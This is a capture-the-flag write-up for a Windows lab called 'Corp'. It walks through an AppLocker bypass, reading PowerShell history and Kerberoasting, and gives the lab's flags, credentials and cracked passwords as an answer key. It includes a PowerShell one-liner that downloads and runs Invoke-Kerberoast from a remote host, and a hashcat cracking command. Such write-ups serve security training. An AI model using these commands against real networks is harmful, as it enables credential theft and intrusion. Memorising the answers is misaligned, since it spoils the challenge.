# CORP

## BASIC INFO
```
Windows machine
export ip=54.194.16.231

Username: corp\dark
Password: _QuejVudId6
```

# BYPASSING APP LOCKER

`C:\Windows\System32\spool\divers\color` is by default whitelisted.\

> - **Access the file and obtain the flag.**
>> flag{a12a41b5f8111327690f836e9b302f0b}

Windows powershell saves all previous command into a file called ConsoleHost_history located at `%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`

## KERBERROASTING

Lets first enumerate Windows. If we run `setspn -T medin -Q ​ */*` we can extract all accounts in the SPN.\
SPN is the Service Principal Name, and is the mapping between service and account.\
> - **Running that command, we find an existing SPN. What user is that for?**
>> fela


Using Powershell to Invoke-Kerberoast script.
```
iex​(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1')

Invoke-Kerberoast -OutputFormat hashcat ​ |fl
```

Copy the hash down and save it into a file.\
Next, run `hashcat -m 13100 -a 0 hash.txt --wordlist /usr/share/wordlists/rockyou.txt --force`

> - **What is the users password in plain text?**
>> rubenF124

> - **Login as this user. What is his flag?**
>> flag{bde1642535aa396d2439d86fe54a36e4}

Go to `C:\Users\fela.CORP`, when it prompt to gain access click yes and use the credentials found above.

> - **What is the decoded password?**
>> tqjJpEX9Qv8ybKI3yHcc=L!5e(!wW;$T

> - **Now we have the Administrator's password, login as them and obtain the last flag.**
>> THM{g00d_j0b_SYS4DM1n_M4s73R}

![badges](../../../badges/dianchia.png)